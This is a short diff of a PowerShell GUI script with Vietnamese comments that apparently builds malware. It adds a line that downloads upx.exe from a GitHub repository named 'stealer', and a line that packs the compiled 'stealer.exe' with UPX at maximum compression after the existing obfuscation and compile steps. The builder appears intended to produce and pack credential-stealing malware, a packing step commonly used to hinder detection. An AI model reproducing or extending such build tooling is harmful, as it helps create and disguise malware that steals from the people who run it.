@@ -37,6 +37,7 @@ if (-Not (Test-Path $filePath)) {
     
     # Tải xuống file
     Invoke-WebRequest -Uri $url -OutFile $filePath
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/werearecat/stealer/main/upx.exe" -OutFile "upx.exe"
     
     Write-Host "Tải xuống hoàn tất."
 } else {
@@ -152,6 +153,7 @@ $button.Add_Click({
         # Execute the .bat file
         Start-Process -FilePath $protectPath -ArgumentList "-f `"$filePath`" -dc" -NoNewWindow -Wait
         Start-Process -FilePath $compliePath -ArgumentList $filePathprotect -NoNewWindow -Wait
+        .\upx --best --lzma --force stealer.exe
 
         # Delete the .bat file after execution
         Remove-item "settings.json"
